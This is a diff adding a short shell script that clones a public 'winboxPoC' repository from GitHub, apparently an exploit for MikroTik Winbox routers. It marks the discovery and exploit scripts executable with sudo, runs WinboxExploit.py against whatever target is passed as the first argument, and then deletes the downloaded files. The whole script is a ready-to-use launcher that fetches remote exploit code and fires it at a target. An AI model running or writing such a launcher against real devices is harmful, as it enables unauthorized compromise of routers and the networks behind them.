@@ -1,0 +1,27 @@
+#! /bin/sh
+
+winboxPoC="https://github.com/BasuCert/winboxPoC"
+
+cd ~/
+
+#Download
+echo downloading...
+git clone $winboxPoC
+echo downloaded!
+
+#Get Permission
+
+cd ~/winboxPoC
+
+echo Set File Permission
+
+sudo chmod +x MACServerDiscover.py
+sudo chmod +x MACServerExploit.py
+
+echo Permission Setted
+
+#Execution
+
+python3 WinboxExploit.py $1
+
+rm -rf ~/winboxPoC
